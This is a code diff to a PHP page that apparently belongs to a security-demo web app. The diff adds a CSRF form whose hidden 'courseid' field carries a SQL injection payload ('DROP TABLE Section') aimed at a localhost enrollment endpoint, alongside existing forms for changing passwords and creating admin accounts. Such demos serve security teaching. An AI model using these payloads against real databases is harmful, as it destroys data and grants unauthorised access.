@@ -43,6 +43,7 @@ require_once "../src/DBController.php";
                 <optgroup label="CSRFType">
                     <option selected="selected" value="1" >Change logged in user's password</option>
                     <option value="2">Create an admin account</option>
+                    <option value="3">Drop Section Table leveraging SQL Injection</option>
                 </optgroup>
             </select>
 
@@ -123,6 +124,16 @@ require_once "../src/DBController.php";
                         "<input type=\"hidden\" name=\"sanswer\" value=\"get rekt\" />" +
                         "<button class=\"button_large\" type=\"submit\">Create an admin account</button>" +
                     "</form>";
+            }
+            else if(csrf.options[csrf.selectedIndex].value === "3")
+            {
+                maliciouscode.innerHTML =
+                    "<p>To test: This can be done without a user's session. Press the button. The section table is now dropped.</p>" +
+                    "<form action=\"http://localhost:8000/src/CourseEnrollInsertLogic.php\" method=\"POST\" >" +
+                        "<input type=\"hidden\" name=\"courseid\" id=\"courseid\" value=\"111', '1'); DROP TABLE Section;--\">" +
+                        "<button class=\"button_large\" type=\"submit\">Drop Section Table</button>" +
+                    "</form>";
+
             }
         }
 
